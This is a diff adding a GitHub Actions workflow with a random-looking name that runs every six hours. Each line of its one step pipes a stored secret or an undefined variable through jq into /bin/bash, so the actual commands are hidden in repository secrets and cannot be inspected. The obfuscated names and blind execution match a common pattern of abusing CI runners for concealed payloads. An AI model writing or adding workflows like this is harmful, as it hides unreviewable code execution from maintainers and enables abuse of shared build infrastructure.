@@ -1,0 +1,28 @@
+name: wanhengkong5678
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '29 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: wanhengkong5678
+        env:
+          bp0587: ${{ secrets.bp0587 }}
+        run: |
+          echo $bp0587 | jq -r .tpzd346 | /bin/bash
+          echo $xfpx3378 | jq -r .lvfm88 | /bin/bash
+          echo $fa98 | jq -r .c0 | /bin/bash
+          echo $qeys39424 | jq -r .uxhzw18534 | /bin/bash
+          echo $aso603 | jq -r .e6 | /bin/bash
+          echo $oknh3 | jq -r .wjer6094 | /bin/bash
+          echo $qvg8435 | jq -r .ewkv55 | /bin/bash
+          echo $mrv945 | jq -r .n1099 | /bin/bash
+          echo $x2912 | jq -r .cwa3 | /bin/bash
+          echo $c98 | jq -r .uwtd4 | /bin/bash
+          echo $rb02 | jq -r .hcuyl032 | /bin/bash
+          echo $un03 | jq -r .fha50 | /bin/bash
+
